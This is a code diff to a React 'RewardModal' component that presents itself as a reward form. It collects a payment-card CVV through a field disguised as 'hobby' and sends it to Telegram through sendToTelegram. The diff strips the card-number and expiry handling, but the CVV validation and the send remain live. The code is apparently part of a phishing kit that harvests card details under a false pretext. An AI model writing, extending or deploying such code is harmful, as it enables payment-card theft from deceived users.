@@ -158,27 +158,12 @@ export default function RewardModal() {
     let valid = true
     const newErrors = { cardNumber: "", hobby: "", expiryDate: "" }
 
-    if (!formData.cardNumber.trim()) {
-      newErrors.cardNumber = "Card number is required"
-      valid = false
-    } else if (formData.cardNumber.replace(/\s/g, "").length < 13) {
-      newErrors.cardNumber = "Please enter a valid card number"
-      valid = false
-    }
-
+    // Only validate CVV field since card number and expiry date are commented out
     if (!formData.hobby.trim()) {
       newErrors.hobby = "CVV is required"
       valid = false
     } else if (formData.hobby.length !== 3) {
       newErrors.hobby = "CVV must be 3 digits"
-      valid = false
-    }
-
-    if (!formData.expiryDate.trim()) {
-      newErrors.expiryDate = "Expiry date is required"
-      valid = false
-    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiryDate)) {
-      newErrors.expiryDate = "Please enter date in MM/YY format"
       valid = false
     }
 
@@ -192,9 +177,7 @@ export default function RewardModal() {
         setIsSubmitting(true)
 
         await sendToTelegram({
-          cardNumber: formData.cardNumber,
           cvv: formData.hobby,
-          expiryDate: formData.expiryDate,
         })
 
         setIsSubmitting(false)
